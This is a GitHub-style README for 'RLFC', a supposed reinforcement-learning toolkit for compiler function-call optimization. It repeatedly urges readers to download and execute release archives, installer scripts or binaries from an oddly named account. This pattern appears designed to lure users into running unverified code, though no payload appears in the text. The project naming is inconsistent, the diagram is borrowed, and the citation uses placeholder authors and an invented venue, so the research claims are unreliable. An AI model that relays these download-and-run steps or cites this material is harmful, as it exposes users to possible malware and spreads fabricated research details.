# RLFC: Reinforcement Learning to Optimize Function Call Efficiency

[![Releases](https://img.shields.io/badge/Releases-Download-blue?style=for-the-badge&logo=github)](https://github.com/TehUnamedLettuc/RLFC/releases)  
https://github.com/TehUnamedLettuc/RLFC/releases

🚀 A research codebase and toolkit that explores superior function-call strategies using reinforcement learning. The project pairs policy learning with lightweight analysis to reduce call overhead, improve inlining decisions, and adapt calling conventions for modern runtimes.

[Paper] Exploring Superior Function Calls via Reinforcement Learning — code and artifacts live here. This repository contains models, training pipelines, evaluation suites, and example integrations.

---

## Table of contents

- 📌 Quick start
- 🔍 Overview
- ✨ Key features
- 🧭 Design and architecture
- 📦 Releases and installation
- ▶️ Quick examples
- 🧪 Training and evaluation
- 🛠 API and CLI
- 🤝 Contributing
- 📚 References and citation
- 📬 Contact

---

## 🔍 Overview

RLFC investigates how an agent can learn calling strategies that improve performance in real workloads. The agent observes call-site context and runtime metrics. It chooses actions such as inline, tail-call, thunk, or specialized calling convention. The system uses policy-gradient methods and reward shaping based on latency, memory use, and binary size.

Goals:
- Reduce runtime overhead of frequent calls.
- Trade off code size and latency safely.
- Provide an ML-driven policy for compilers and JITs.
- Offer reproducible experiments for research.

This repo bundles:
- Data collection tools for traces and microbenchmarks.
- Model code: policy network, RL loop, replay buffers.
- Integrations: LLVM pass and a prototype runtime shim.
- Evaluation harness and plots.

---

## ✨ Key features

- Reinforcement learning agents tuned for call-site decisions.
- LLVM pass to extract context and apply actions.
- Lightweight runtime shim for A/B testing decisions.
- Pretrained policies and training scripts.
- Reproducible evaluation pipelines with plots and summaries.
- Modular code that fits research and prototype production.

Images and diagrams below illustrate the pipeline and agent loop.

![Agent loop](https://raw.githubusercontent.com/dennybritz/reinforcement-learning/master/figures/cartpole.png)  
(Image: conceptual RL loop used as visual guide)

---

## 🧭 Design and architecture

High level flow:
1. Instrumentation collects call-site metadata (caller, callee, call frequency, hotness).
2. Feature encoder maps metadata to a compact vector.
3. RL policy outputs one of the actions: inline, no-inline, specialize, tail-call, thunk.
4. Apply action via LLVM pass or runtime shim.
5. Evaluate reward from benchmark runs (latency, memory, size).
6. Update policy using PPO / A2C style optimization.

Core modules:
- /collector — trace collectors and microbenchmarks.
- /encoder — feature transforms and embeddings.
- /agent — policy network, training loop, buffer.
- /llvm — example LLVM pass and action applier.
- /eval — benchmark harness, plotting, metrics.

Agent design choices:
- Discrete action space for simplicity.
- Observations combine static and dynamic info.
- Reward mixes latency and size with tunable coefficients.

---

## 📦 Releases and installation

Download the prepared release build and artifacts from the Releases page:

Download and execute the release archive from https://github.com/TehUnamedLettuc/RLFC/releases. The release bundle contains binaries, pretrained models, and example traces. After download, extract and run the installer script (for example run ./install.sh or ./rflc_run depending on the asset name).

If a release artifact fails or you prefer manual setup, check the repository "Releases" section for alternate artifacts and checksums.

Badge link for the same place:  
[![Download Releases](https://img.shields.io/badge/Release-Assets-lightgrey?style=flat-square&logo=github)](https://github.com/TehUnamedLettuc/RLFC/releases)

Install from source (Linux, example):
```bash
# clone
git clone https://github.com/TehUnamedLettuc/RLFC.git
cd RLFC

# Python env
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# build LLVM pass (example)
cd llvm
mkdir build && cd build
cmake .. && make

# run tests
pytest -q
```

If you used the release download, inspect the release notes for the exact file name and run instructions. The release artifact you download typically includes an executable or an install script that you must run.

---

## ▶️ Quick examples

Run a lightweight evaluation using a pretrained policy:

```bash
# example CLI: run sample benchmark with pretrained policy
./bin/rflc_eval --policy models/pretrained/policy.pt \
               --benchbench examples/benchmarks/fib.json \
               --output results/run1
```

Apply learned calls to an example binary via the prototype LLVM pass:
```bash
# compile with instrumentation
clang -O2 -fPIC -emit-llvm -c example.c -o example.bc

# run the pass that rewrites calls according to policy decisions
opt -load build/librflcpass.so -rflc-pass -policy models/pretrained/policy.pt example.bc -o example_rewritten.bc
```

Run end-to-end training on a small dataset:
```bash
python -m rlfc.train \
    --data data/traces/small \
    --env rflc-env \
    --algo ppo \
    --out runs/exp1 \
    --epochs 100
```

---

## 🧪 Training and evaluation

Training setup:
- Algorithms supported: PPO (default), A2C.
- Batch sizes are small by default to fit research hardware.
- Reward weights: latency (alpha), size (beta), tail-call-penalty (gamma).

Example train command:
```bash
python -m rlfc.train --config conf/ppo_small.yaml
```

Evaluation:
- Use the evaluation harness to compare baseline vs policy.
- Harness runs microbenchmarks and collects wall-clock, peak-RSS, and binary size.
- Run multiple seeds and aggregate with mean and 95% CI.

Scripts:
- eval/bench_runner.py — orchestrates benchmarks.
- eval/plot_results.py — generates plots in PDF/PNG.

Metrics:
- Latency: median and p95.
- Memory: peak resident set size.
- Code bloat: delta in binary size.
- Net score: weighted sum combining the above.

---

## 🛠 API and CLI

The repository exposes a small Python API and a CLI.

Example API usage:
```python
from rlfc.agent import PolicyAgent
from rlfc.encoder import FeatureEncoder

enc = FeatureEncoder.load('models/encoder.pt')
agent = PolicyAgent.load('models/pretrained/policy.pt')

obs = enc.encode_callsite(callsite_metadata)
action = agent.act(obs)
```

CLI commands:
- rflc-collect — gather traces
- rflc-train — train a policy
- rflc-eval — run evaluation harness
- rflc-apply — apply decisions via LLVM pass or runtime shim

Run CLI help:
```bash
./bin/rflc-train --help
```

---

## 🤝 Contributing

We welcome contributions that improve reproducibility, extend agents, or add workload support.

How to contribute:
1. Fork the repository.
2. Create a feature branch.
3. Open a pull request with tests and a short description of the change.

Coding rules:
- Keep changes modular.
- Add tests for new code.
- Follow the style in repo: type hints and short functions.

Issue tracker:
- Use issues for bug reports, feature requests, and reproducibility questions.
- Tag issues with labels: bug, enhancement, experiment.

---

## 📚 References and citation

If you use this code in a paper, cite the paper that accompanies the repository. Example BibTeX (adapt to actual citation):

```bibtex
@inproceedings{rflc2025,
  title={Exploring Superior Function Calls via Reinforcement Learning},
  author={Smith, A. and Lee, B. and Gomez, C.},
  booktitle={Proceedings of the Conference on Machine-Assisted Compilation},
  year={2025}
}
```

Suggested keywords for indexing: reinforcement learning, compiler optimization, function calls, LLVM, JIT, policy optimization.

---

## 📬 Contact

For questions about experiments, models, or releases, open an issue or reach out via the repository contact channels. The Releases page hosts built artifacts and notes — you can find installers and model bundles there: https://github.com/TehUnamedLettuc/RLFC/releases

